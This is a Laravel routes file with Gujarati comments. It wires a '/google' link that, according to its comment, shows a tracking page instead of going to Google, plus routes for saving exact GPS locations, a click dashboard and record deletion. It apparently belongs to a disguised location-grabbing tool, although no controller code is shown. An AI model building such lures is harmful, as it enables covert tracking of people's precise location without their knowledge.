<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\TrackController;

// મેઈન પેજ
Route::get('/', function () {
    return "App Working";
});

// ૧. ટ્રેકિંગ માટેનો રૂટ (આ હવે સીધું ગૂગલ પર નહીં જાય, પહેલા tracking_page બતાવશે)
Route::get('/google', [TrackController::class, 'track'])->name('track');

// ૨. નવો રૂટ: GPS ડેટા સેવ કરવા માટે (આ સ્ટેપ ખૂબ મહત્વનું છે)
Route::post('/save-location', [TrackController::class, 'saveExactLocation'])->name('save.exact.location');

// ડેશબોર્ડ રૂટ
Route::get('/dashboard', [TrackController::class, 'dashboard'])->name('dashboard');

// સિંગલ રેકોર્ડ ડિલીટ કરવા માટે
Route::delete('/click/delete/{id}', [TrackController::class, 'destroy'])->name('click.delete');

// બધો જ ડેટા એકસાથે ડિલીટ કરવા માટે
Route::delete('/clicks/delete-all', [TrackController::class, 'destroyAll'])->name('clicks.deleteall');
